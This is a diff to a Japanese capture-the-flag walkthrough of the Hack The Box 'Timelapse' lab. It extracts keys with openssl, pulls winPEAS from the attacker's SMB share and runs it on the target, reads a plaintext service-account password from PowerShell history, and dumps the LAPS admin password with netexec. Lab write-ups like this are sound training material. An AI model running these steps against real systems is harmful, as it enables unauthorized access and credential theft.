@@ -163,10 +163,10 @@ Session completed.
 ```
 pfxから公開鍵と秘密鍵の証明書を入手
 ```sh
-└─$ openssl pkcs12 -in legacyy_dev_auth.pfx -clcerts -nokeys -out publicCert.pem
+└─$ openssl pkcs12 -in legacyy_dev_auth.pfx -clcerts -nokeys -out cert.crt
 Enter Import Password:
 
-└─$ openssl pkcs12 -in legacyy_dev_auth.pfx -nocerts -out priv-key.pem -nodes   
+└─$ openssl pkcs12 -in legacyy_dev_auth.pfx -nocerts -out privkey.pem -nodes   
 Enter Import Password:
 
 └─$ ls -l publicCert.pem priv-key.pem
@@ -190,4 +190,353 @@ Info: Establishing connection to remote endpoint
 
 *Evil-WinRM* PS C:\Users\legacyy\Documents> cat ../Desktop/user.txt
 4e9c380f75f6cc9170a322e038205ec7
+```
+
+
+## STEP 3
+winpeasを回す
+```sh
+└─$ cp /usr/share/peass/winpeas/winPEASx64.exe .
+
+└─$ impacket-smbserver share . -smb2support
+Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Config file parsed
+[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
+[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
+[*] Config file parsed
+[*] Config file parsed
+```
+```powershell
+*Evil-WinRM* PS C:\Users\legacyy\Documents>  copy \\10.10.16.24\share\winPEASx64.exe .
+
+*Evil-WinRM* PS C:\Users\legacyy\Documents> .\winPEASx64.exe systeminfo quiet
+ [!] If you want to run the file analysis checks (search sensitive information in files), you need to specify the 'fileanalysis' or 'all' argument. Note that this search might take several minutes. For help, run winpeass.exe --help
+ANSI color bit for Windows is not set. If you are executing this from a Windows terminal inside the host you should run 'REG ADD HKCU\Console /v VirtualTerminalLevel /t REG_DWORD /d 1' and then start a new CMD
+Long paths are disabled, so the maximum length of a path supported is 260 chars (this may cause false negatives when looking for files). If you are admin, you can enable it with 'REG ADD HKLM\SYSTEM\CurrentControlSet\Control\FileSystem /v VirtualTerminalLevel /t REG_DWORD /d 1' and then start a new CMD
+  WinPEAS-ng by @hacktricks_live
+
+       /---------------------------------------------------------------------------------\
+       |                             Do you like PEASS?                                  |
+       |---------------------------------------------------------------------------------|
+       |         Learn Cloud Hacking       :     training.hacktricks.xyz                 |
+       |         Follow on Twitter         :     @hacktricks_live                        |
+       |         Respect on HTB            :     SirBroccoli                             |
+       |---------------------------------------------------------------------------------|
+       |                                 Thank you!                                      |
+       \---------------------------------------------------------------------------------/
+
+  [+] Legend:
+         Red                Indicates a special privilege over an object or something is misconfigured
+         Green              Indicates that some protection is enabled or something is well configured
+         Cyan               Indicates active users
+         Blue               Indicates disabled users
+         LightYellow        Indicates links
+
+ You can find a Windows local PE Checklist here: https://book.hacktricks.wiki/en/windows-hardening/checklist-windows-privilege-escalation.html
+   Creating Dynamic lists, this could take a while, please wait...
+   - Loading sensitive_files yaml definitions file...
+   - Loading regexes yaml definitions file...
+   - Checking if domain...
+   - Getting Win32_UserAccount info...
+Error while getting Win32_UserAccount info: System.Management.ManagementException: Access denied
+   at System.Management.ThreadDispatch.Start()
+   at System.Management.ManagementScope.Initialize()
+   at System.Management.ManagementObjectSearcher.Initialize()
+   at System.Management.ManagementObjectSearcher.Get()
+   at winPEAS.Checks.Checks.CreateDynamicLists(Boolean isFileSearchEnabled)
+   - Creating current user groups list...
+   - Creating active users list (local only)...
+  [X] Exception: Object reference not set to an instance of an object.
+   - Creating disabled users list...
+  [X] Exception: Object reference not set to an instance of an object.
+   - Admin users list...
+  [X] Exception: Object reference not set to an instance of an object.
+   - Creating AppLocker bypass list...
+   - Creating files/directories list for search...
+        [skipped, file search is disabled]
+
+
+ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ¹ System Information ÌÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ
+
+ÉÍÍÍÍÍÍÍÍÍÍ¹ Basic System Information
+È Check if the Windows versions is vulnerable to some known exploit https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#version-exploits
+  [X] Exception: Access is denied
+
+ÉÍÍÍÍÍÍÍÍÍÍ¹ Showing All Microsoft Updates
+  [X] Exception: Creating an instance of the COM component with CLSID {B699E5E8-67FF-4177-88B0-3684A3388BFB} from the IClassFactory failed due to the following error: 80070005 Access is denied. (Exception from HRESULT: 0x80070005 (E_ACCESSDENIED)).
+
+ÉÍÍÍÍÍÍÍÍÍÍ¹ System Last Shutdown Date/time (from Registry)
+
+    Last Shutdown Date/time        :    3/25/2022 2:10:18 AM
+
+ÉÍÍÍÍÍÍÍÍÍÍ¹ User Environment Variables
+È Check for some passwords or keys in the env variables 
+    COMPUTERNAME: DC01
+    PUBLIC: C:\Users\Public
+    LOCALAPPDATA: C:\Users\legacyy\AppData\Local
+    PSModulePath: C:\Users\legacyy\Documents\WindowsPowerShell\Modules;C:\Program Files\WindowsPowerShell\Modules;C:\Windows\system32\WindowsPowerShell\v1.0\Modules
+    PROCESSOR_ARCHITECTURE: AMD64
+    Path: C:\Windows\system32;C:\Windows;C:\Windows\System32\Wbem;C:\Windows\System32\WindowsPowerShell\v1.0\;C:\Windows\System32\OpenSSH\;C:\Users\legacyy\AppData\Local\Microsoft\WindowsApps
+    CommonProgramFiles(x86): C:\Program Files (x86)\Common Files
+    ProgramFiles(x86): C:\Program Files (x86)
+    PROCESSOR_LEVEL: 25
+    ProgramFiles: C:\Program Files
+    PATHEXT: .COM;.EXE;.BAT;.CMD;.VBS;.VBE;.JS;.JSE;.WSF;.WSH;.MSC;.CPL
+    USERPROFILE: C:\Users\legacyy
+    SystemRoot: C:\Windows
+    ALLUSERSPROFILE: C:\ProgramData
+    DriverData: C:\Windows\System32\Drivers\DriverData
+    ProgramData: C:\ProgramData
+    PROCESSOR_REVISION: 0101
+    USERNAME: legacyy
+    CommonProgramW6432: C:\Program Files\Common Files
+    CommonProgramFiles: C:\Program Files\Common Files
+    OS: Windows_NT
+    PROCESSOR_IDENTIFIER: AMD64 Family 25 Model 1 Stepping 1, AuthenticAMD
+    ComSpec: C:\Windows\system32\cmd.exe
+    SystemDrive: C:
+    TEMP: C:\Users\legacyy\AppData\Local\Temp
+    NUMBER_OF_PROCESSORS: 2
+    APPDATA: C:\Users\legacyy\AppData\Roaming
+    TMP: C:\Users\legacyy\AppData\Local\Temp
+    ProgramW6432: C:\Program Files
+    windir: C:\Windows
+    USERDOMAIN: TIMELAPSE
+    USERDNSDOMAIN: TIMELAPSE.HTB
+
+ÉÍÍÍÍÍÍÍÍÍÍ¹ System Environment Variables
+È Check for some passwords or keys in the env variables 
+    ComSpec: C:\Windows\system32\cmd.exe
+    DriverData: C:\Windows\System32\Drivers\DriverData
+    OS: Windows_NT
+    Path: C:\Windows\system32;C:\Windows;C:\Windows\System32\Wbem;C:\Windows\System32\WindowsPowerShell\v1.0\;C:\Windows\System32\OpenSSH\
+    PATHEXT: .COM;.EXE;.BAT;.CMD;.VBS;.VBE;.JS;.JSE;.WSF;.WSH;.MSC
+    PROCESSOR_ARCHITECTURE: AMD64
+    PSModulePath: C:\Program Files\WindowsPowerShell\Modules;C:\Windows\system32\WindowsPowerShell\v1.0\Modules
+    TEMP: C:\Windows\TEMP
+    TMP: C:\Windows\TEMP
+    USERNAME: SYSTEM
+    windir: C:\Windows
+    NUMBER_OF_PROCESSORS: 2
+    PROCESSOR_LEVEL: 25
+    PROCESSOR_IDENTIFIER: AMD64 Family 25 Model 1 Stepping 1, AuthenticAMD
+    PROCESSOR_REVISION: 0101
+
+ÉÍÍÍÍÍÍÍÍÍÍ¹ Audit Settings
+È Check what is being logged 
+    Not Found
+
+ÉÍÍÍÍÍÍÍÍÍÍ¹ Audit Policy Settings - Classic & Advanced
+
+ÉÍÍÍÍÍÍÍÍÍÍ¹ WEF Settings
+È Windows Event Forwarding, is interesting to know were are sent the logs 
+    Not Found
+
+ÉÍÍÍÍÍÍÍÍÍÍ¹ LAPS Settings
+È If installed, local administrator password is changed frequently and is restricted by ACL 
+    LAPS Enabled: 1
+    LAPS Admin Account Name: 
+    LAPS Password Complexity: 4
+    LAPS Password Length: 24
+    LAPS Expiration Protection Enabled: 1
+
+ÉÍÍÍÍÍÍÍÍÍÍ¹ Wdigest
+È If enabled, plain-text crds could be stored in LSASS https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#wdigest
+    Wdigest is not enabled
+
+ÉÍÍÍÍÍÍÍÍÍÍ¹ LSA Protection
+È If enabled, a driver is needed to read LSASS memory (If Secure Boot or UEFI, RunAsPPL cannot be disabled by deleting the registry key) https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#lsa-protection                                                                                                                                                                                                                                 
+    LSA Protection is not enabled
+
+ÉÍÍÍÍÍÍÍÍÍÍ¹ Credentials Guard
+È If enabled, a driver is needed to read LSASS memory https://book.hacktricks.wiki/windows-hardening/stealing-credentials/credentials-protections#credentials-guard
+    CredentialGuard is not enabled
+
+ÉÍÍÍÍÍÍÍÍÍÍ¹ Cached Creds
+È If > 0, credentials will be cached in the registry and accessible by SYSTEM user https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#cached-credentials
+    cachedlogonscount is 10
+
+ÉÍÍÍÍÍÍÍÍÍÍ¹ Enumerating saved credentials in Registry (CurrentPass)
+
+ÉÍÍÍÍÍÍÍÍÍÍ¹ AV Information
+  [X] Exception: Invalid namespace 
+    No AV was detected!!
+    Not Found
+
+ÉÍÍÍÍÍÍÍÍÍÍ¹ Windows Defender configuration
+  Local Settings
+  Group Policy Settings
+
+ÉÍÍÍÍÍÍÍÍÍÍ¹ UAC Status
+È If you are in the Administrators group check how to bypass the UAC https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#from-administrator-medium-to-high-integrity-level--uac-bypasss
+    ConsentPromptBehaviorAdmin: 5 - PromptForNonWindowsBinaries
+    EnableLUA: 1
+    LocalAccountTokenFilterPolicy: 
+    FilterAdministratorToken: 
+      [*] LocalAccountTokenFilterPolicy set to 0 and FilterAdministratorToken != 1.
+      [-] Only the RID-500 local admin account can be used for lateral movement.                                                                                                                                                            
+
+ÉÍÍÍÍÍÍÍÍÍÍ¹ PowerShell Settings
+    PowerShell v2 Version: 2.0
+    PowerShell v5 Version: 5.1.17763.1
+    PowerShell Core Version: 
+    Transcription Settings: 
+    Module Logging Settings: 
+    Scriptblock Logging Settings: 
+    PS history file: C:\Users\legacyy\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
+    PS history size: 434B
+
+ÉÍÍÍÍÍÍÍÍÍÍ¹ Enumerating PowerShell Session Settings using the registry
+      You must be an administrator to run this check
+
+ÉÍÍÍÍÍÍÍÍÍÍ¹ PS default transcripts history
+È Read the PS history inside these files (if any)
+
+ÉÍÍÍÍÍÍÍÍÍÍ¹ HKCU Internet Settings
+    DisableCachingOfSSLPages: 0
+    IE5_UA_Backup_Flag: 5.0
+    PrivacyAdvanced: 1
+    SecureProtocols: 2688
+    User Agent: Mozilla/4.0 (compatible; MSIE 8.0; Win32)
+    CertificateRevocation: 1
+    ZonesSecurityUpgrade: System.Byte[]
+
+ÉÍÍÍÍÍÍÍÍÍÍ¹ HKLM Internet Settings
+    ActiveXCache: C:\Windows\Downloaded Program Files
+    CodeBaseSearchPath: CODEBASE
+    EnablePunycode: 1
+    MinorVersion: 0
+    WarnOnIntranet: 1
+
+ÉÍÍÍÍÍÍÍÍÍÍ¹ Drives Information
+È Remember that you should search more info inside the other drives 
+    C:\ (Type: Fixed)(Filesystem: NTFS)(Available space: 5 GB)(Permissions: Users [Allow: AppendData/CreateDirectories])
+
+ÉÍÍÍÍÍÍÍÍÍÍ¹ Checking WSUS
+È  https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#wsus
+    Not Found
+
+ÉÍÍÍÍÍÍÍÍÍÍ¹ Checking KrbRelayUp
+È  https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#krbrelayup
+  The system is inside a domain (TIMELAPSE) so it could be vulnerable.
+È You can try https://github.com/Dec0ne/KrbRelayUp to escalate privileges
+
+ÉÍÍÍÍÍÍÍÍÍÍ¹ Checking If Inside Container
+È If the binary cexecsvc.exe or associated service exists, you are inside Docker 
+You are NOT inside a container
+
+ÉÍÍÍÍÍÍÍÍÍÍ¹ Checking AlwaysInstallElevated
+È  https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#alwaysinstallelevated
+    AlwaysInstallElevated isn't available
+
+ÉÍÍÍÍÍÍÍÍÍÍ¹ Enumerate LSA settings - auth packages included
+                                                                                                                                                                                                                                            
+    auditbasedirectories                 :       0
+    auditbaseobjects                     :       0
+    Bounds                               :       00-30-00-00-00-20-00-00
+    crashonauditfail                     :       0
+    fullprivilegeauditing                :       00
+    LimitBlankPasswordUse                :       1
+    NoLmHash                             :       1
+    Security Packages                    :       ""
+    Notification Packages                :       rassfm,scecli
+    Authentication Packages              :       msv1_0
+    LsaPid                               :       636
+    LsaCfgFlagsDefault                   :       0
+    SecureBoot                           :       1
+    ProductType                          :       7
+    disabledomaincreds                   :       0
+    everyoneincludesanonymous            :       0
+    forceguest                           :       0
+    restrictanonymous                    :       0
+    restrictanonymoussam                 :       1
+
+ÉÍÍÍÍÍÍÍÍÍÍ¹ Enumerating NTLM Settings
+  LanmanCompatibilityLevel    :  (Send NTLMv2 response only - Win7+ default)
+                                                                                                                                                                                                                                            
+
+  NTLM Signing Settings                                                                                                                                                                                                                     
+      ClientRequireSigning    : False
+      ClientNegotiateSigning  : True
+      ServerRequireSigning    : True
+      ServerNegotiateSigning  : True
+      LdapSigning             : Negotiate signing (Negotiate signing)
+
+  Session Security                                                                                                                                                                                                                          
+      NTLMMinClientSec        : 536870912 (Require 128-bit encryption)
+      NTLMMinServerSec        : 536870912 (Require 128-bit encryption)
+                                                                                                                                                                                                                                            
+
+  NTLM Auditing and Restrictions                                                                                                                                                                                                            
+      InboundRestrictions     :  (Not defined)
+      OutboundRestrictions    :  (Not defined)
+      InboundAuditing         :  (Not defined)
+      OutboundExceptions      :
+
+ÉÍÍÍÍÍÍÍÍÍÍ¹ Display Local Group Policy settings - local users/machine
+
+ÉÍÍÍÍÍÍÍÍÍÍ¹ Checking AppLocker effective policy
+   AppLockerPolicy version: 1
+   listing rules:
+
+
+
+ÉÍÍÍÍÍÍÍÍÍÍ¹ Enumerating Printers (WMI)
+
+ÉÍÍÍÍÍÍÍÍÍÍ¹ Enumerating Named Pipes
+  Name                                                                                                 CurrentUserPerms                                                       Sddl
+
+  eventlog                                                                                             Everyone [Allow: WriteData/CreateFiles]                                O:LSG:LSD:P(A;;0x12019b;;;WD)(A;;CC;;;OW)(A;;0x12008f;;;S-1-5-80-880578595-1860270145-482643319-2788375705-1540778122)
+
+  ROUTER                                                                                               Everyone [Allow: WriteData/CreateFiles]                                O:SYG:SYD:P(A;;0x12019b;;;WD)(A;;0x12019b;;;AN)(A;;FA;;;SY)
+
+  RpcProxy\49673                                                                                       Everyone [Allow: WriteData/CreateFiles]                                O:BAG:SYD:(A;;0x12019b;;;WD)(A;;0x12019b;;;AN)(A;;FA;;;BA)
+
+  RpcProxy\593                                                                                         Everyone [Allow: WriteData/CreateFiles]                                O:NSG:NSD:(A;;0x12019b;;;WD)(A;;RC;;;OW)(A;;0x12019b;;;AN)(A;;FA;;;S-1-5-80-521322694-906040134-3864710659-1525148216-3451224162)(A;;FA;;;S-1-5-80-979556362-403687129-3954533659-2335141334-1547273080)
+
+  vgauth-service                                                                                       Everyone [Allow: WriteData/CreateFiles]                                O:BAG:SYD:P(A;;0x12019f;;;WD)(A;;FA;;;SY)(A;;FA;;;BA)
+
+
+ÉÍÍÍÍÍÍÍÍÍÍ¹ Enumerating AMSI registered providers
+
+ÉÍÍÍÍÍÍÍÍÍÍ¹ Enumerating Sysmon configuration
+      You must be an administrator to run this check
+
+ÉÍÍÍÍÍÍÍÍÍÍ¹ Enumerating Sysmon process creation logs (1)
+      You must be an administrator to run this check
+
+ÉÍÍÍÍÍÍÍÍÍÍ¹ Installed .NET versions
+                                                                                                                                                                                                                                            
+
+       /---------------------------------------------------------------------------------\                                                                                                                                                  
+       |                             Do you like PEASS?                                  |                                                                                                                                                  
+       |---------------------------------------------------------------------------------|                                                                                                                                                  
+       |         Learn Cloud Hacking       :     training.hacktricks.xyz                 |                                                                                                                                                  
+       |         Follow on Twitter         :     @hacktricks_live                        |                                                                                                                                                  
+       |         Respect on HTB            :     SirBroccoli                             |                                                                                                                                                  
+       |---------------------------------------------------------------------------------|                                                                                                                                                  
+       |                                 Thank you!                                      |                                                                                                                                                  
+       \---------------------------------------------------------------------------------/   
+```
+```powershell
+*Evil-WinRM* PS C:\Users\legacyy\Documents> cat C:\Users\legacyy\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
+whoami
+ipconfig /all
+netstat -ano |select-string LIST
+$so = New-PSSessionOption -SkipCACheck -SkipCNCheck -SkipRevocationCheck
+$p = ConvertTo-SecureString 'E3R$Q62^12p7PLlC%KWaxuaV' -AsPlainText -Force
+$c = New-Object System.Management.Automation.PSCredential ('svc_deploy', $p)
+invoke-command -computername localhost -credential $c -port 5986 -usessl -
+SessionOption $so -scriptblock {whoami}
+get-aduser -filter * -properties *
+exit
+```
+ldap経由でldapsを読み取り成功
+```sh
+└─$ netexec ldap 10.129.227.113 -u 'timelapse.htb\svc_deploy' -p 'E3R$Q62^12p7PLlC%KWaxuaV' -M laps
+LDAP        10.129.227.113  389    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:timelapse.htb)
+LDAP        10.129.227.113  389    DC01             [+] timelapse.htb\svc_deploy:E3R$Q62^12p7PLlC%KWaxuaV 
+LAPS        10.129.227.113  389    DC01             [*] Getting LAPS Passwords
+LAPS        10.129.227.113  389    DC01             Computer:DC01$ User:                Password:@@@k+lTm/&4iI5OjbG&K3npu
 ```
